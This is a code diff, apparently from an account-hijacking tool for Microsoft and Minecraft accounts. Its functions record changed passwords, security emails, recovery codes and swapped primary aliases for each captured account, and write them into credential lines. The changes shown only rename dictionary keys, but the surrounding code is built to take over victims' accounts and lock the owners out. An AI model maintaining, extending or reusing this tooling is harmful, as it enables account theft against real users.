@@ -29,10 +29,10 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
     mc = (record.get("minecraft") or {}).copy()
     sec = str(ms.get("security_email") or "").strip()
     pwd = str(ms.get("password") or "").strip()
-    rec = str(ms.get("rec_code") or "").strip()
-    origin = str(ms.get("orig_email") or email or "").strip() or email
+    rec = str(ms.get("recovery_code") or "").strip()
+    origin = str(ms.get("original_email") or email or "").strip() or email
     primary = str(ms.get("email") or "").strip() or origin
-    swapped = ms.get("alias_swapped")
+    swapped = ms.get("primary_alias_replaced")
     if swapped is None and primary.lower() != origin.lower():
         swapped = True
 
@@ -48,12 +48,12 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
 
     summary = {
         "email": primary,
-        "orig_email": origin,
+        "original_email": origin,
         "sec_mail": sec or "Couldn't Change!",
         "password": pwd or "Couldn't Change!",
-        "rec_code": rec or "Couldn't Change!",
+        "recovery_code": rec or "Couldn't Change!",
         "username": mc.get("name"),
-        "alias_swapped": swapped,
+        "primary_alias_replaced": swapped,
     }
     ms.update(summary)
 
@@ -89,7 +89,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
             "email": email or "Couldn't Change!",
             "sec_mail": "Couldn't Change!",
             "password": "Couldn't Change!",
-            "rec_code": "Couldn't Change!",
+            "recovery_code": "Couldn't Change!",
             "auth_secret": "Disabled",
             "firstName": "Failed to Get",
             "lastName": "Failed to Get",
@@ -147,7 +147,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
     if rextra:
         account["microsoft"]["password"] = rextra.get("password")
         account["microsoft"]["security_email"] = rextra.get("security_email")
-        account["microsoft"]["rec_code"] = rextra.get("rec_code")
+        account["microsoft"]["recovery_code"] = rextra.get("recovery_code")
 
     if embed_chk and msaauth == "Family":
         rom.warning("embed verify — family interrupt, going cookies-only")
@@ -267,7 +267,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
         add_cred_line_field(
             fb,
             email=ms.get("email", ""),
-            recovery=ms.get("rec_code", ""),
+            recovery=ms.get("recovery_code", ""),
             password=ms.get("password", ""),
             sec_mail=ms.get("security_email", ""),
             username=account["minecraft"].get("name", ""),
